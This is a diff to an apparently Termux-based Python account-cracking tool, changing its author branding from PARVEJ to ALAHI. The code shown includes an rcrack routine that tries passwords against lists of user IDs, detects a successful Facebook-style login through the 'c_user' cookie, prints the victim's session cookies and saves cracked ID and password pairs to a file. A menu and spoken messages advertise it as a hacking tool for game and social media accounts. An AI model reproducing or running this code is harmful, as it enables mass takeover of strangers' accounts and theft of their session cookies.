@@ -1,5 +1,5 @@
 import os
-print("\033[1;92m [•] PARVEJ  (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+print("\033[1;92m [•] ALAHI  (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
 os.system("pkg install espeak")
 print("\033[1;92m   [•] ROBOT INSTALL COMPLETE \033[1;30m")
 os.system('espeak -a 300 "Robot install complete"')
@@ -111,10 +111,10 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-def PARVEJ_programmer():
+def ALAHI_programmer():
     os.system('clear')
     print(logo)
-    os.system('espeak -a 300 "Walcome To BANGLADESH  PARVEJ CYBER King off PARVEJ WOULD"')
+    os.system('espeak -a 300 "Walcome To BANGLADESH  ALAHI CYBER King off ALAHI WOULD"')
     os.system('speak -a 300 "FREE FIRE. PUBGI. TIKTOK. ACCOUNT. Hack. Tools"')
     print("")
     print('\033[38;5;46m   [01] GAME IDZ CLONING')
@@ -206,7 +206,7 @@ def ALAHI_DX():
         print('\033[38;5;46m   TO STOP PROCESS Ctrl + Z')
         os.system('espeak -a 300 "clone stop to press cntrol z"')
         print('\033[38;5;46m   WILL RUN ON ANY NETWORK')
-        jalan('  PARVEJ ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄ WAIT A 5 MINUTES PARVEJ ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄')
+        jalan('  ALAHI ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄ WAIT A 5 MINUTES ALAHI ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄')
         os.system('espeak -a 300 "Wait for 5 minutes"')
         print('')
         for love in user:
@@ -215,7 +215,7 @@ def ALAHI_DX():
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mCRACK PROCESS HAS BEEN COMPLETED ')
     os.system('espeak -a 300 "PROCESS HAS BEEN COMPLETED"')
-    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mIDS SAVED IN PARVEJ.txt')
+    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mIDS SAVED IN ALAHI.txt')
  
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -263,10 +263,10 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[38;5;46m[🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝] '+cid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
+                print('\033[38;5;46m[🦋⃟ᎶꫝᴍᴇᏒ✮⃝ALAHI𝄟⃝] '+cid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
                 os.system('espeak -a 300 "Congratulations. ok id"')
                 cek_apk(session,coki)
-                open('/sdcard/\033[38;5;46m🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/\033[38;5;46m🦋⃟ᎶꫝᴍᴇᏒ✮⃝ALAHI𝄟⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             else:
@@ -277,7 +277,7 @@ def rcrack(uid,pwx,tl):
         colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
         colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
-        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
+        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ALAHI𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
         sys.stdout.flush()
     except:
         pass
